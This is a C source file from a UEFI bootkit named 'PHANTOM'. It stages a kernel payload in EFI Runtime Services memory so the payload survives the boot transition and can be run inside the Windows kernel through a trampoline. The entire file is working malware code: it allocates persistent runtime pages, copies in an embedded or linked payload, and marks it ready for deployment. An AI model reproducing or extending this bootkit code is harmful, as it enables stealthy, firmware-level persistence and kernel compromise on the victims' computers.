/*
 * PHANTOM EFI Bootkit - Payload Staging
 *
 * Prepares the kernel payload in EFI Runtime Services memory.
 * This memory region persists after ExitBootServices and is accessible
 * during early kernel initialization, giving us a stable anchor.
 *
 * The payload is mapped as EfiRuntimeServicesCode, which ntoskrnl
 * preserves as part of the UEFI runtime mapping.
 */

#include "bootkit.h"

/* kernel payload binary (linked from kernel/ sources) */
extern UINT8  _binary_kernel_payload_bin_start[];
extern UINT8  _binary_kernel_payload_bin_end[];
extern UINTN  _binary_kernel_payload_bin_size;

/* fallback: embedded payload blob */
#include "kernel_payload_blob.h"

EFI_STATUS BkPrepareKernelPayload(VOID)
{
    EFI_STATUS  Status;
    UINTN       PayloadSize;
    UINT8      *PayloadData;

    /*
     * Determine payload source.
     * If we have the linked binary, use it.
     * Otherwise fall back to the embedded blob.
     */
#ifdef PAYLOAD_LINKED
    PayloadData = _binary_kernel_payload_bin_start;
    PayloadSize = (UINTN)(_binary_kernel_payload_bin_end - _binary_kernel_payload_bin_start);
#else
    PayloadData = (UINT8 *)gKernelPayloadBlob;
    PayloadSize = sizeof(gKernelPayloadBlob);
#endif

    if (PayloadSize == 0 || PayloadSize > 0x800000) {
        return EFI_INVALID_PARAMETER;
    }

    /*
     * Allocate EFI Runtime Services memory for the payload.
     * This type of memory is preserved by the OS kernel and mapped
     * into the kernel's virtual address space. It's the most reliable
     * way to survive the boot transition.
     *
     * We request a specific physical address range to avoid conflicts
     * with the kernel's memory layout. The address 0x50000 is typically
     * available (below 1MB, in the legacy BIOS area).
     *
     * Alternatively, we allocate anywhere and record the physical address
     * for the trampoline to find us.
     */
    UINTN Pages = (PayloadSize + 4095) / 4096;

    /* try to allocate at a preferred address first */
    EFI_PHYSICAL_ADDRESS PreferredAddr = 0x50000;
    Status = gCtx.BootServices->AllocatePages(
        AllocateAddress,
        EfiRuntimeServicesCode,
        Pages,
        &PreferredAddr
    );

    if (EFI_ERROR(Status)) {
        /* fallback: let UEFI pick the address */
        PreferredAddr = 0;
        Status = gCtx.BootServices->AllocatePages(
            AllocateAnyPages,
            EfiRuntimeServicesCode,
            Pages,
            &PreferredAddr
        );
    }

    if (EFI_ERROR(Status)) {
        return BK_ERR_ALLOC_FAILED;
    }

    /* copy payload to runtime memory */
    VOID *PayloadDest = (VOID *)PreferredAddr;
    CopyMem(PayloadDest, PayloadData, PayloadSize);

    /* zero the rest of the page to avoid leaking data */
    UINTN TotalSize = Pages * 4096;
    if (TotalSize > PayloadSize) {
        SetMem((UINT8 *)PayloadDest + PayloadSize, TotalSize - PayloadSize, 0);
    }

    /* record in context */
    gCtx.PayloadPhysical = PayloadDest;
    gCtx.PayloadSize     = PayloadSize;

    return EFI_SUCCESS;
}

EFI_STATUS BkDeployPayload(VOID)
{
    if (!gCtx.PayloadPhysical || !gCtx.PayloadSize)
        return BK_ERR_NOT_FOUND;

    if (!gCtx.NtoskrnlBase)
        return BK_ERR_NOT_FOUND;

    /*
     * The payload is already in runtime memory. The trampoline in
     * hooks.c passes ntoskrnl base/size via rcx/rdx registers
     * directly to PayloadEntry. No header needed.
     *
     * IMPORTANT: Do NOT write anything at PayloadPhysical —
     * that's the first byte of PayloadEntry's machine code.
     * Writing a header there would destroy the entry point.
     */

    gCtx.PayloadDeployed = TRUE;

    return EFI_SUCCESS;
}
